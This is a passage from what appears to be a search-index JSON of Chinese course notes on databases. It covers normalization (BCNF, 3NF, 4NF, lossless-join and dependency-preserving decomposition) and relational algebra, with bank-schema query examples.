A-&gt;D}\n</code></pre> <p>\u5c06\u95ee\u9898\u6807\u51c6\u5316\u6765\u770b\u5f85\uff0c\u5bf9\u4e8e\u4e00\u4e2a Functional Dependency \\(\\alpha \\rightarrow \\beta\\)\uff1a</p> <ul> <li>\u6d4b\u8bd5\u5de6\u4fa7 \\(\\alpha\\) \u5185\u7684 Attribute \\(A\\) \u662f\u5426\u591a\u4f59\uff1f<ul> <li>\u68c0\u67e5 \\((\\alpha - A)^+\\) \u662f\u5426\u5305\u542b \\(\\beta\\)\uff0c\u5982\u679c\u5305\u542b\uff0c\u5219 \\(A\\) \u591a\u4f59</li> </ul> </li> <li>\u6d4b\u8bd5\u53f3\u4fa7 \\(\\beta\\) \u5185\u7684 Attribute \\(A\\) \u662f\u5426\u591a\u4f59\uff1f<ul> <li>\u68c0\u67e5 \\(\\alpha^+\\) \u662f\u5426\u5305\u542b \\(A\\)\uff0c\u5982\u679c\u5305\u542b\uff0c\u5219 \\(A\\) \u591a\u4f59</li> </ul> </li> </ul>"},{"location":"Courses/DB/Relational%20Database%20Design/#decomposition","title":"Decomposition","text":"<p>\u4e00\u4e2a Bad Relation \u7684\u8bbe\u8ba1\u53ef\u80fd\u5b58\u5728\u4ee5\u4e0b\u7f3a\u70b9\uff1a</p> <ul> <li>&lt;1&gt; Information Redundancy \u4fe1\u606f\u5197\u4f59</li> <li>&lt;2&gt; Updating Difficulty \u66f4\u65b0\u56f0\u96be</li> <li>&lt;3&gt; Insert/Delete Anomalies \u63d2\u5165/\u5220\u9664\u5f02\u5e38</li> </ul> <p>\u5bf9\u4e8e\u8fd9\u4e9b\u4e0d\u662f \"good\" form \u7684 Relation \\(R\\)\uff0c\u6211\u4eec\u9700\u8981\u5c06\u5176\u5206\u89e3\u4e3a\u4e00\u7ec4\u5173\u7cfb \\(\\{R_1, R_2,..., R_n\\}\\)\uff0c\u5b83\u4eec\u6709\u4ee5\u4e0b\u7279\u70b9\uff1a</p> <ul> <li>&lt;1&gt; The decomposition is a lossless-join decomposition \u65e0\u635f\u8fde\u63a5\u5206\u89e3</li> <li>&lt;2&gt; The decomposition is dependency preservation \u4f9d\u8d56\u4fdd\u6301</li> <li>&lt;3&gt; Each relation \\(R_i\\) is in good form<ul> <li>such as BCNF or Third Normal Form(3NF)</li> </ul> </li> </ul> <p>Design Method</p> <p>Universal Relation(\u6cdb\u5173\u7cfb) -&gt; Decomposition -&gt; Good Database Schema</p> <p>\u5c06 \\(R\\) \u5206\u89e3\u4e3a \\(R_1\\) \u548c \\(R_2\\) \u662f\u65e0\u635f\u8fde\u63a5\u7684\u5145\u8981\u6761\u4ef6\u662f\uff0c\u81f3\u5c11\u6709\u4ee5\u4e0b\u4e00\u4e2a\u4f9d\u8d56\u5173\u7cfb\u5728 \\(F^+\\) \u4e2d\u6ee1\u8db3\uff1a</p> \\[\\begin{array}l \\{R_1 \\cap R_2\\} \\rightarrow R_1 \\\\ \\{R_1 \\cap R_2\\} \\rightarrow R_2 \\end{array} \\] <p>\u4ea6\u5373\uff1a\u5206\u89e3\u540e\u4e24\u4e2a\u5b50 Schema \u7684\u5171\u540c\u5c5e\u6027\u5fc5\u987b\u662f \\(R_1\\) \u6216 \\(R_2\\) \u7684 Super Key\uff08\u9002\u7528\u4e00\u5206\u4e3a\u4e8c\u7684\u5206\u89e3\uff09\u3002</p> <p>Dependency Preservation \u5219\u8981\u6c42\u5bf9\u4e8e \\(F\\) \u4e2d\u7684\u6bcf\u4e00\u4e2a \\(\\alpha \\rightarrow \\beta\\) \u90fd\u80fd\u6709\u4e00\u4e2a \\(R_i\\) \u6ee1\u8db3 Functional Dependency\uff0c\u5219\u79f0\u8be5\u5206\u89e3\u6ee1\u8db3\u4f9d\u8d56\u4fdd\u6301\uff0c\u5176\u5fc5\u7136\u6ee1\u8db3\uff1a</p> \\[ (F_1 \\cup F_2 \\cup ... \\cup F_n)^+ = F^+ \\] <p>\u4e00\u4e2a\u5178\u578b\u7684\u9519\u8bef\u5206\u89e3\u4f8b\u5b50\u4e3a\uff1a</p> <p>\\(R=(A,B,C), F=\\{A\\rightarrow B, B\\rightarrow C\\}\\)\uff0c\u6211\u4eec\u5c06\u5176\u5206\u89e3\u4e3a \\(R_1 = (A,B), R_2=(A,C)\\)\u3002</p> <ul> <li>Check lossless-join: \\(R_1 \\cap R_2 = \\{A\\}\\) and \\(R_1 \\subset (A)^+=\\{ABC\\}\\)</li> <li>Check dependency preservation: \\(F_1=\\{A\\rightarrow B\\}, F_2=\\{A\\rightarrow C\\}\\)\uff0cbut \\((F_1 \\cup F_2)^+ = \\{A\\rightarrow B, A\\rightarrow C\\}^+ \\ne F^+\\)<ul> <li>\u5c11\u4e86 \\(B\\rightarrow C\\)</li> </ul> </li> </ul> <p>\u56e0\u6b64\u8be5\u65e0\u635f\u5206\u89e3\u4e0d\u6ee1\u8db3 Dependency Preservation\u3002</p>"},{"location":"Courses/DB/Relational%20Database%20Design/#normal-form","title":"Normal Form","text":""},{"location":"Courses/DB/Relational%20Database%20Design/#first-normal-form","title":"First Normal Form","text":"<p>\u5143\u7d20\u4e0d\u53ef\u5206\u7684 Domain \u79f0\u4e3a Atomic Domain\u3002\u5982\u679c\u4e00\u4e2a Relational Schema \\(R\\) \u7684\u6240\u6709 attribute \u7684 domains \u90fd\u662f atomic \u7684\uff0c\u5219\u79f0\u8fd9\u4e2a Schema \u5c5e\u4e8e First Normal Form(1NF)\u3002</p> <p>\u5bf9\u4e8e Relational Database\uff0c\u8981\u6c42\u6240\u6709 Relations \u90fd\u5c5e\u4e8e 1NF\u3002</p> <p>Example of non-atomic Domains</p> <ul> <li>Composite Attribute</li> <li>Multi-value Attribute</li> <li>Complex Data Type</li> </ul>"},{"location":"Courses/DB/Relational%20Database%20Design/#boyce-codd-normal-form","title":"Boyce-Codd Normal Form","text":"<p>\u3010Definition\u3011 \u4e00\u4e2a\u5c5e\u4e8e BCNF \u7684 Relation Schema \\(R\\) \uff0c\u5bf9\u4e8e\u5176\u51fd\u6570\u4f9d\u8d56 \\(F^+\\)\uff0c\u4efb\u610f \\(\\alpha \\rightarrow \\beta\\) \u90fd\u6ee1\u8db3\u81f3\u5c11\u4e0b\u9762\u4e00\u6761\uff1a</p> <ul> <li>&lt;1&gt; \\(\\alpha \\rightarrow \\beta\\) is trivial</li> <li>&lt;2&gt; \\(\\alpha\\) \u662f \\(R\\) \u7684 superkey<ul> <li>\u5373 \\(R\\subseteq \\alpha^+\\) or \\(\\alpha \\rightarrow R\\)</li> </ul> </li> </ul> <p>Trivial Dependency</p> <p>\u5bf9\u4e8e\u51fd\u6570\u4f9d\u8d56 \\(\\alpha \\rightarrow \\beta\\) \uff0c\u5982\u679c \\(\\beta \\subseteq \\alpha\\) \uff0c\u5219\u79f0\u5176\u4e3a Trivial Functional Dependency\u3002\u4f8b\u5982 \\(A\\rightarrow A, \\ AB\\rightarrow A\\)</p> <p>\u4efb\u4f55\u53ea\u6709\u4e24\u4e2a Attribute \u7684 Schema \u90fd\u5c5e\u4e8e BCNF</p> <p>\u6709\u65f6\u5019\uff0c\u6211\u4eec\u4e0d\u80fd\u8ba9\u4e00\u4e2a\u5206\u89e3\u540c\u65f6\u6ee1\u8db3\u5176\u65e2\u4fdd\u6301\u4e86\u4f9d\u8d56\uff0c\u53c8\u662f BCNF \u5f62\u5f0f\uff0c\u4f8b\u5982\uff1a</p> <p>\\(R=(J,K,L)\\)\uff0c\\(J\\) \u662f\u5b66\u751f\uff0c\\(K\\) \u662f\u8bfe\u7a0b\uff0c\\(L\\) \u662f\u8001\u5e08\uff1b\u5176\u51fd\u6570\u4f9d\u8d56\u4e3a \\(F=\\{JK\\rightarrow L, L\\rightarrow  K\\}\\) (\u4e00\u4e2a\u8001\u5e08\u53ea\u6559\u4e00\u95e8\u8bfe)\u3002\u90a3\u4e48\u5bf9\u4e8e\u6b64\u4f8b\uff0c\u4efb\u4f55\u5206\u89e3\u90fd\u4e0d\u80fd\u4fdd\u6301 \\(JK\\rightarrow L\\)\uff0c\u4f8b\u5982 \\(R_1=(L,K)\\), \\(R_2=(J,L)\\)\uff0c\u5b83\u4eec\u90fd\u5c5e\u4e8e BCNF\uff0c\u4f46\u4e0d\u6ee1\u8db3 Dependency Preservation\u3002</p> <p>\u3010Solution\u3011 \u4e8b\u5b9e\u4e0a\uff0c\u9488\u5bf9 BCNF \u7684\u5206\u89e3\u6709\u5982\u4e0b\u8ba1\u7b97\u65b9\u6cd5\uff1a</p> <ul> <li>&lt;1&gt; \u627e\u51fa\u7ed3\u679c\u96c6\u5408\u4e2d\u8fd8\u6ca1\u80fd\u6ee1\u8db3 BCNF \u5b9a\u4e49\u7684 Schema \\(R_i\\)<ul> <li>\u5b83\u4e00\u5b9a\u5b58\u5728\u4e00\u4e2a\u975e Trivial \u51fd\u6570 \\(\\alpha \\rightarrow \\beta\\)\uff0c\u5e76\u4e14 \\(\\alpha\\) \u4e0d\u662f \\(R_i\\) \u7684 superkey</li> </ul> </li> <li>&lt;2&gt; \u4f9d\u636e\u8be5\u51fd\u6570\uff0c\u5c06 \\(R_i\\) \u5206\u89e3\u4e3a \\(R_{i1}\\) \u548c \\(R_{i2}\\)<ul> <li>\\(R_{i1} = (\\alpha, \\beta)\\), \\(R_{i2}= R_i - \\beta\\)</li> </ul> </li> <li>&lt;3&gt; \u56de\u5230 &lt;1&gt;</li> </ul> <p>\u4e0d\u80fd\u4fdd\u8bc1\u4e00\u5b9a\u6ee1\u8db3 Dependency Preserving\uff0c\u53ea\u80fd\u786e\u4fdd\u6240\u6709\u5b50 Schema \u90fd\u662f BCNF</p>"},{"location":"Courses/DB/Relational%20Database%20Design/#third-normal-form","title":"Third Normal Form","text":"<p>\u4e3a\u4e86\u89e3\u51b3 BCNF \u6709\u65f6\u4e0d\u80fd\u6ee1\u8db3\u51fd\u6570\u4f9d\u8d56\u4fdd\u6301\u7684\u95ee\u9898\uff0c\u6211\u4eec\u5b9a\u4e49\u4e86\u4e00\u4e2a\u66f4 Weak \u7684 Normal Form\uff0c\u79f0\u4e3a 3NF\uff0c\u5373\u5bf9\u4e8e\u4efb\u610f \\(\\alpha \\rightarrow \\beta\\) in \\(F^+\\)\uff0c\u81f3\u5c11\u6ee1\u8db3\u4ee5\u4e0b\u4e00\u6761\uff1a</p> <ul> <li>&lt;1&gt; \\(\\alpha \\rightarrow \\beta\\) is trivial</li> <li>&lt;2&gt; \\(\\alpha\\) \u662f \\(R\\) \u7684 superkey<ul> <li>\u5373 \\(R\\subseteq \\alpha^+\\) or \\(\\alpha \\rightarrow R\\)</li> </ul> </li> <li>&lt;3&gt; \u5bf9\u4e8e\u6bcf\u4e2a Attribute \\(A\\in \\beta -\\alpha\\)\uff0c\\(A\\) \u90fd\u88ab \\(R\\) \u67d0\u4e2a Candidate Key \u5305\u542b<ul> <li>\u5f53 \\(\\beta\\) \u4e0d\u5c5e\u4e8e\u6240\u6709 Candidate Key \u65f6\uff0c\\(\\alpha\\) \u5fc5\u987b\u662f superkey\uff0c\u5373\u6ee1\u8db3\u6761\u4ef6&lt;2&gt;</li> <li>\u5f53 \\(\\beta\\) \u5c5e\u4e8e\u4efb\u610f Candidate Key \u65f6\uff0c\\(\\alpha\\) \u65e0\u9650\u5236</li> </ul> </li> </ul> <p>\u6839\u636e\u5b9a\u4e49\u770b\u51fa\uff0cBCNF \u5305\u542b\u5728 3NF \u5185\uff0c\u4e5f\u53ef\u4ee5\u8bf4 3NF \u662f Minimum relaxation of BCNF to ensure dependency preservation\u3002</p> <p>There is always a lossless-join, dependency-preserving decomposition into 3NF</p> <p>\u6d4b\u8bd5\u662f\u5426\u4e3a 3NF \u662f\u4e00\u4e2a NPH \u95ee\u9898\uff0c\u5b83\u9700\u8981\u68c0\u67e5\u6240\u6709 Candidate Keys</p> <p>\u4e0d\u8fc7 Decomposition into 3NF \u53ef\u4ee5\u5728\u7ebf\u6027\u65f6\u95f4\u5185\u5b8c\u6210</p> <p></p> <p>\u5bf9\u4e8e\u6211\u4eec\u7684 Relational Database Design\uff0c\u76ee\u6807\u4e00\u822c\u4e3a\uff1a</p> <ul> <li>&lt;1&gt; BCNF</li> <li>&lt;2&gt; Lossless Join</li> <li>&lt;3&gt; Dependency Preservation</li> </ul> <p>\u5982\u679c\u6211\u4eec\u4e0d\u80fd\u540c\u65f6\u6ee1\u8db3\u4ee5\u4e0a\u4e09\u70b9\uff0c\u5219\u6211\u4eec\u63a5\u53d7\u4ee5\u4e0b\u5176\u4e2d\u4e00\u4e2a\u7f3a\u70b9\uff1a</p> <ul> <li>&lt;1&gt; Lack of Dependency Preservation</li> <li>&lt;2&gt; 3NF instead of BCNF<ul> <li>\u901a\u5e38\u4f1a\u5e26\u6765\u4e00\u70b9 Redundancy</li> </ul> </li> </ul> <p>\u3010Solution\u3011 \u9488\u5bf9 3NF \u7684\u5206\u89e3\u6709\u5982\u4e0b\u8ba1\u7b97\u65b9\u6cd5\uff1a</p> <ul> <li>&lt;1&gt; \u8ba1\u7b97 \\(F_c\\)\uff0c\u5c06 \\(F_c\\) \u4e2d\u6bcf\u4e00\u4e2a \\(\\alpha \\rightarrow \\beta\\) \u90fd\u5206\u89e3\u4e3a Schema \\(R_i:= (\\alpha, \\beta)\\)</li> <li>&lt;2&gt; \u68c0\u67e5\u662f\u5426\u5b58\u5728 \\(R_i \\rightarrow R\\)\uff0c\u5373\u4fdd\u8bc1 Lossless-join<ul> <li>\u5982\u679c\u4e0d\u5b58\u5728\uff0c\u5219\u6dfb\u52a0\u65b0 Schema \\(R_i:= \\text{any candidate key of}\\ R\\)</li> </ul> </li> <li>&lt;3&gt; \u8fd4\u56de\u7ed3\u679c</li> </ul> <p>\u3010Example\u3011 \u5047\u8bbe\u6211\u4eec\u6709\u5173\u7cfb \\(R(A,B,C,D)\\) \u548c\u5176\u4f9d\u8d56\u96c6 \\(F= \\{A \\rightarrow B,\\ B \\rightarrow C,\\ C \\rightarrow D\\}\\)\u3002</p> <ul> <li>Step 1: \\(F_c = F\\)\uff0c\u5c06\u6bcf\u6761\u4f9d\u8d56\u6784\u9020\u6210\u5bf9\u5e94 Schema\uff1a</li> </ul> \u51fd\u6570\u4f9d\u8d56 \u6784\u9020\u7684\u6a21\u5f0f \\(R_i\\) \\(A \\to B\\) \\(R_1 = (A, B)\\) \\(B \\to C\\) \\(R_2 = (B, C)\\) \\(C \\to D\\) \\(R_3 = (C, D)\\) <ul> <li>Step 2: \u5148\u627e\u51fa\u5173\u7cfb \\(R\\) \u7684 Candidate Key\uff0c\u672c\u4f8b\u4e2d\u4e3a \\(A\\)\uff1b\u7136\u540e\u68c0\u67e5\u662f\u5426\u5b58\u5728\u67d0\u4e2a \\(R_i\\) \u5305\u542b \\(A\\)</li> </ul> \u6a21\u5f0f \\(R_i\\) \u5305\u542b\u5019\u9009\u952e \\(A\\) \u5417\uff1f \\(R_1(A, B)\\) \u2705 \u662f \\(R_2(B, C)\\) \u274c \u5426 \\(R_3(C, D)\\) \u274c \u5426 <p>\u56e0\u4e3a\u6709 \\(R_1\\) \u5305\u542b\uff0c\u6240\u4ee5\u65e0\u9700\u6dfb\u52a0\u989d\u5916 Schema\uff0c\u6700\u7ec8\u7ed3\u679c\u4e3a\uff1a</p> <pre><code>R1(A, B)  \nR2(B, C)  \nR3(C, D)\n</code></pre>"},{"location":"Courses/DB/Relational%20Database%20Design/#fourth-normal-form","title":"Fourth Normal Form","text":"<p>4NF \u662f BCNF \u7684\u4e00\u4e2a\u7f29\u7d27\u3002\u5728\u4ecb\u7ecd 4NF \u4e4b\u524d\uff0c\u6211\u4eec\u9700\u8981\u5f15\u5165 Multivalued Dependencies \u7684\u6982\u5ff5\u3002</p> <p>\u5047\u5b9a\u6211\u4eec\u6709\u8868 classes(course, teacher, book)\uff0c\u5176\u4e2d course:teacher\uff0ccourse:book \u90fd\u662f\u4e00\u5bf9\u591a\u7684\u5173\u7cfb\uff0c\u5373\u4e00\u95e8\u8bfe\u6709\u591a\u4e2a\u8001\u5e08\u4e0a\uff0c\u4e00\u95e8\u8bfe\u6709\u591a\u4e2a\u8bfe\u672c\u3002</p> <p>\u5728\u8fd9\u4e2a\u5173\u7cfb\u4e2d\uff0c\u4e09\u4e2a Attribute \u90fd\u662f Independent \u7684\uff0c\u5373\u5b83\u4eec\u7684 \\(F\\) \u4e2d\u53ea\u5305\u542b Trival Functional Dependencies\u3002\u6839\u636e\u5b9a\u4e49\uff0c\u8be5\u8868\u5c5e\u4e8e BCNF\u3002</p> <p>\u4f46\u662f\uff0c\u5728\u5b9e\u9645\u4e0a\u770b\u5230\u8be5\u8868\u65f6\uff0c\u6211\u4eec\u80fd\u591f\u770b\u5230\u5176\u91cd\u590d\u4fe1\u606f\u7684\u5197\u4f59\uff1a</p> <p></p> <p>\u5982\u679c\u60f3\u8981\u4e3a\u4e00\u95e8\u8bfe\u6dfb\u52a0\u4e00\u95e8\u8bfe\u672c\uff0c\u5219\u9700\u8981\u63d2\u5165\u8fd9\u95e8\u8bfe\u8001\u5e08\u6570\u91cf\u7684 Tuples</p> <p>\u3010Definition\u3011 \u5bf9\u4e8e Schema \\(R\\)\uff0c\\(\\alpha \\subseteq R\\)\uff0c\\(\\beta \\subseteq R\\)\uff0c\u5b9a\u4e49\u4e00\u4e2a Multivalued Dependency \\(\\alpha \\rightarrow \\rightarrow \\beta\\) \u5f53\u4e14\u4ec5\u5f53\u5bf9\u4e8e\u4efb\u610f\u5408\u6cd5\u5173\u7cfb \\(r(R)\\) \u7684\u56db\u4e2a Tuple \\(t_1, t_2, t_3, t_4\\)\uff0c\u5176\u6ee1\u8db3\uff1a</p> \\[ \\begin{cases}t_1[\\alpha]= t_2[\\alpha] = t_3[\\alpha] = t_4[\\alpha] \\\\  t_1[\\beta] = t_3[\\beta] \\\\ t_2[\\beta] = t_4[\\beta] \\end{cases} \\Rightarrow \\begin{cases} t_2[R-\\alpha -\\beta] = t_3[R-\\alpha-\\beta] \\\\ t_1[R-\\alpha-\\beta] = t_4[R-\\alpha-\\beta]  \\end{cases} \\] <p></p> Another Definition in 3 tuples <p></p> <p>If \\(\\alpha \\rightarrow \\beta\\), then \\(\\alpha \\rightarrow \\rightarrow \\beta\\)</p> <p>Every functional dependency is also a multivalued dependency</p> <p>\u3010Definition\u3011 \u4e00\u4e2a\u5c5e\u4e8e 4NF \u7684 Relation Schema \\(R\\) \uff0c\u5bf9\u4e8e\u5176\u51fd\u6570\u4f9d\u8d56\u548c\u591a\u503c\u4f9d\u8d56 \\(D^+\\)\uff0c\u4efb\u610f \\(\\alpha \\rightarrow \\rightarrow \\beta\\) \u90fd\u6ee1\u8db3\u81f3\u5c11\u4e0b\u9762\u4e00\u6761\uff1a</p> <ul> <li>&lt;1&gt; \\(\\alpha \\rightarrow \\rightarrow \\beta\\) is trivial</li> <li>&lt;2&gt; \\(\\alpha\\) \u662f \\(R\\) \u7684 superkey<ul> <li>\u5373 \\(R\\subseteq \\alpha^+\\) or \\(\\alpha \\rightarrow R\\)</li> </ul> </li> </ul> <p>\u73b0\u5728\u6211\u4eec\u60f3\u8981\u5c06 \\(R\\) \u4ee5 4NF \u7684\u5f62\u5f0f Decomposition\uff0c\\(D\\) \u5bf9 \\(R_i\\) \u6709\u5982\u4e0b\u7ea6\u675f\uff1a</p> <ul> <li>&lt;1&gt; \\(D^+\\) \u4e2d\u7684\u4efb\u610f Functional Dependency \u53ea\u5305\u542b\u67d0\u4e2a \\(R_i\\) \u7684 Attribute</li> <li>&lt;2&gt; \u5bf9\u4e8e\u6240\u6709\u5f62\u5f0f\u4e3a \\(\\alpha \\rightarrow \\rightarrow (\\beta \\cap R_i)\\) \u7684 Multivalued Dependency\uff0c\u5982\u679c \\(\\alpha \\subseteq R_i\\)\uff0c\u5219 \\(\\alpha \\rightarrow \\rightarrow \\beta\\) \u4e00\u5b9a\u4f4d\u4e8e \\(D^+\\) \u4e2d</li> </ul>"},{"location":"Courses/DB/Relational%20Model/","title":"Relational Model","text":""},{"location":"Courses/DB/Relational%20Model/#relational-model","title":"Relational Model","text":"<p> \u7ea6 1230 \u4e2a\u5b57  17 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p>"},{"location":"Courses/DB/Relational%20Model/#structure-of-relational-databases","title":"Structure of Relational Databases","text":"<p>\u4e00\u4e2a Relational Database \u662f\u57fa\u4e8e Relational Model \u7684\uff0c\u4e00\u4e2a\u6216\u591a\u4e2a Relation \u7684\u96c6\u5408\u3002Relation \u8868\u793a\u4e3a\u62e5\u6709 Row \u548c Column \u7684\u4e8c\u7ef4\u8868\u3002</p> <p>\u5728\u66f4\u6b63\u5f0f\u7684\u5b9a\u4e49\u4e0b\uff0cRelation \u8868\u793a\u4e3a\u4e00\u7ec4 Domain \u7684\u7b1b\u5361\u5c14\u79ef\u7684\u5b50\u96c6\uff0c\u5373 \\(r\\subseteq D_1 \\times D_2 \\times ...\\times D_n\\)\uff1a</p> <p></p> <p>\u4e8c\u7ef4\u8868\u7684 Column \u88ab\u79f0\u4e3a attribute\uff0c\u6bcf\u4e2a attribute \u5141\u8bb8\u53d6\u503c\u8303\u56f4\u5373\u4e3a\u8be5 attribute \u7684 domain\u3002</p> <p>\u7279\u6b8a\u503c <code>null</code> \u662f\u6bcf\u4e2a domain \u7684\u5143\u7d20</p> <p>Relation \u6709\u4e24\u4e2a\u76f8\u5173\u6982\u5ff5\uff1a</p> <ul> <li>Database schema\u00a0-- the logical structure of the database.</li> <li>Database instance\u00a0-- the snapshot of the data in the database at a given instant in time.</li> </ul> Example <p></p> <p>\u5176\u4e2d\uff0crelation \u4e2d tuples \u7684\u4f4d\u7f6e\u987a\u5e8f\u662f\u4efb\u610f\u7684\uff0c\u5e76\u4e14\u4e0d\u5141\u8bb8\u6709\u91cd\u590d\u7684 tuples \u51fa\u73b0\u3002</p> <p>\u6709\u51e0\u7c7b\u7279\u6b8a\u7684 attribute \u88ab\u79f0\u4e3a Key\uff08\u7801/\u952e\uff09\uff1a</p> <ul> <li>Superkey: Values for \\(K\\) are sufficient to identify a unique tuple of each possible relation \\(r(R)\\)<ul> <li>e.g.: \\(\\{ID\\}\\) or \\(\\{ID, name\\}\\)</li> </ul> </li> <li>Candidate Key: the minimal superkey<ul> <li>e.g.: \\(\\{ID\\}\\)</li> </ul> </li> <li>Primary Key: \u7528\u6237\u6307\u5b9a\u7684 Candidate Key\uff0c\u901a\u5e38\u5e26\u6709\u4e0b\u5212\u7ebf\u6807\u8bc6</li> <li>Foreign Key: Relation \\(r_2\\) \u7684\u4e3b\u952e\u540c\u65f6\u4e3a\u53e6\u4e00\u4e2a Relation \\(r_1\\) \u7684\u5c5e\u6027\uff0c\u5219\u5b83\u5728 \\(r_1\\) \u4e2d\u79f0\u4e3a\u5916\u952e<ul> <li>\u6b64\u65f6\u79f0 \\(r_1\\) \u4e3a Referencing Relation(\u53c2\u7167\u5173\u7cfb)\uff0c\\(r_2\\) \u4e3a Referenced Relation(\u88ab\u53c2\u7167\u5173\u7cfb)</li> </ul> </li> </ul> <p>Primary key and foreign key are integrated constraints.</p> Example <p></p>"},{"location":"Courses/DB/Relational%20Model/#relational-algebra","title":"Relational-Algebra","text":"<p>\u5173\u7cfb\u4ee3\u6570\u6709 6 \u79cd\u57fa\u672c\u8fd0\u7b97\u7b26\u548c 3 \u79cd(\u6216\u66f4\u591a)\u62d3\u5c55\u8fd0\u7b97\u7b26\u3002\u5176\u4e2d\u62d3\u5c55\u8fd0\u7b97\u7b26\u53ef\u4ee5\u7531\u57fa\u672c\u8fd0\u7b97\u7b26\u7ec4\u5408\u5f97\u5230\u3002</p> Operator Notation Addition Select \u9009\u62e9 \\(\\sigma_p(r)\\) \\(\\sigma_p(r)=\\{ t \\| t\\in r \\land p(t)\\}\\) Project \u6295\u5f71 \\(\\Pi _{A1, A2, ...,Ak}(r)\\) \\(A_1, ...,A_k\\) \u662f \\(r\\) \u7684 attribute\uff0c\uff0c\u9ed8\u8ba4\u5254\u9664\u91cd\u590d Union \u5e76 \\(r\\cup s\\) \\(r\\cup s =\\{t\\| t\\in r \\lor t\\in s\\}\\) Set Difference \u96c6\u5408\u5dee \\(r-s\\) \\(r-s=\\{t\\| t\\in r\\land t\\notin s\\}\\) Cartesian Product \u7b1b\u5361\u5c14\u79ef \\(r\\times s\\) \\(r\\times s = \\{\\{t\\ q\\}\\| t\\in r \\land q\\in s\\}\\) Rename \u91cd\u547d\u540d \\(\\rho_{X(A1, A2, ..., An)}(E)\\) \u5bf9 Relation E \u53ca\u5176 attribute \u90fd\u91cd\u547d\u540d ++++++++++ +++++ ++++++++++ Set Intersection \u4ea4 \\(r\\cap s\\) \\(r\\cap s=\\{t\\| t\\in r \\land t\\in s\\}\\) Natural Join \u81ea\u7136\u8fde\u63a5 \\(r\\bowtie s\\) \u628a\u76f8\u540c\u7684\u4e24\u4e2a\u5c5e\u6027\u5408\u5e76 Division \u9664 \\(r\\div s\\) \u76f8\u5f53\u4e8e\u7b1b\u5361\u5c14\u79ef\u7684\u9006\u8fd0\u7b97 Assignment \u8d4b\u503c \\(r\\leftarrow s\\) \u7528\u6765\u5bf9\u6570\u636e\u5e93\u8fdb\u884c\u66f4\u6539 <p>\u5728\u4e0d\u52a0\u62ec\u53f7\u7684\u60c5\u51b5\u4e0b\uff0c\u5b83\u4eec\u7684\u5927\u81f4\u4f18\u5148\u7ea7\u4e3a\uff1aProject \uff1e Select \uff1e Cartesion Product \uff1e Join, Division \uff1e Intersection \uff1e Union, Difference </p> Division \u4f8b\u5b50 <p></p> <p>\u63a5\u4e0b\u6765\u4ee5\u4e00\u4e2a Bank \u7684 Example \u6765\u6f14\u793a\u5404\u4e2a\u5173\u7cfb\u4ee3\u6570\u64cd\u4f5c\u7684\u8fd0\u7528\u3002</p> <pre><code>-- \u5206\u652f\u540d, \u5206\u652f\u6240\u5728\u57ce\u5e02, \u603b\u8d22\u4ea7\nbranch(branch-name, branch-city, assets)\n\n-- \u5ba2\u6237\u540d, \u5ba2\u6237\u4f4f\u5740, \u5ba2\u6237\u6240\u5728\u57ce\u5e02\ncustomer(customer-name, customer-street, customer-city)\n\n-- \u5b58\u6b3eID, \u5206\u652f\u540d, \u5b58\u6b3e\u91d1\u989d\naccount(account-number, branch-name, balance)\n\n-- \u8d37\u6b3eID, \u5206\u652f\u540d, \u8d37\u6b3e\u91d1\u989d\nloan(loan-number, branch-name, amount)\n\n-- \u5ba2\u6237\u540d, \u5b58\u6b3eID\ndepositor(customer-name, account-number)\n\n-- \u5ba2\u6237\u540d, \u8d37\u6b3eID\nborrower(customer-name, loan-number)\n</code></pre> <p>Ex1. Find all loans of over $1200</p> <p>\u67e5\u8be2\u6240\u6709\u5927\u4e8e 1200 \u7684\u8d37\u6b3e\u8d26\u5355\uff1a</p> \\[ \\sigma_{amount \\gt 1200}(loan) \\] <p>Ex2. Find the loan number for each loan of an amount greater than $1200</p> <p>\u67e5\u8be2\u6240\u6709\u5927\u4e8e 1200 \u7684\u8d37\u6b3e\u8d26\u5355\u7684 loan number\uff1a</p> \\[ \\Pi_{loan-number}(\\sigma_{amount \\gt 1200}(loan)) \\] <p>Ex3. Find the names of all customers who have a loan, or an account, or both, from the bank</p> <p>\u67e5\u8be2\u6240\u6709\u7684\u5ba2\u6237\u540d\uff0c\u4ed6\u8d77\u7801\u62e5\u6709\u4e00\u4e2a\u8d37\u6b3e\u8d26\u5355\u6216\u8005\u5b58\u6b3e\u8d26\u5355\uff1a</p> \\[ \\Pi_{customer-name}(borrower) \\cup \\Pi _{customer-name}(depositer) \\] <p>Ex4. Find the names of all customers who have a loan at the Perryridge branch</p> <p>\u67e5\u8be2\u6240\u6709\u5ba2\u6237\u540d\uff0c\u5e76\u4e14\u4ed6\u5728 Perryridge \u5206\u884c\u4e2d\u6709\u8d37\u6b3e\uff1a</p> \\[\\begin{array}l Query1: \\Pi_{customer-name}( \\sigma_{branch-name='Perryridge'}(\\\\ \\sigma_{borrower.loan-number=loan.loan-number}(borrower\\times loan))) \\\\ Query2:\\Pi_{customer-name}( \\sigma_{borrower.loan-number = loan.loan-number}\\\\ (borrower\\times (\\sigma_{branch-name='Perryridge'}(loan)))) \\end{array}\\] <p>\u5176\u4e2d Query2 \u6267\u884c\u901f\u5ea6\u66f4\u5feb\uff0c\u56e0\u4e3a\u7b1b\u5361\u5c14\u79ef\u7684\u8ba1\u7b97\u91cf\u76f8\u6bd4\u5176\u5b83\u64cd\u4f5c\u662f\u76f8\u5f53\u5927\u7684\uff0c\u56e0\u6b64\u5148\u628a\u7b1b\u5361\u5c14\u79ef\u7684\u4e24\u4e2a\u64cd\u4f5c\u6570\u8c03\u6574\u5230\u5c3d\u53ef\u80fd\u5c0f\u6267\u884c\u6548\u679c\u624d\u6700\u4f73\u3002</p> <p>\u5f53\u7136\uff0c\u4f60\u4e5f\u53ef\u4ee5\u4f7f\u7528 natural join \u6765\u7b80\u5316\u8fd9\u4e00\u64cd\u4f5c</p> \\[\\Pi_{customer-name}(borrower \\bowtie (\\sigma_{branch-name='Perryridge'}(loan)))\\] <p>Ex5. Find the largest account balance</p> <p>\u627e\u5230\u5b58\u6b3e\u8d26\u5355\u4e2d balance \u6700\u5927\u7684\u503c\uff1a</p> <p>\u627e\u51fa\u6700\u5927\u503c\u8981\u6c42\u81ea\u6bd4\u8f83\uff0c\u56e0\u6b64\u9700\u8981\u91cd\u547d\u540d\u64cd\u4f5c\u6765\u201c\u590d\u5236\u201d\u4e00\u5f20\u8868\uff1a</p> \\[ \\Pi_{balance}(account)- \\Pi_{account.balance}( \\sigma_{account.balance &lt; d.balance}( account \\times \\rho_{d}(account))) \\] 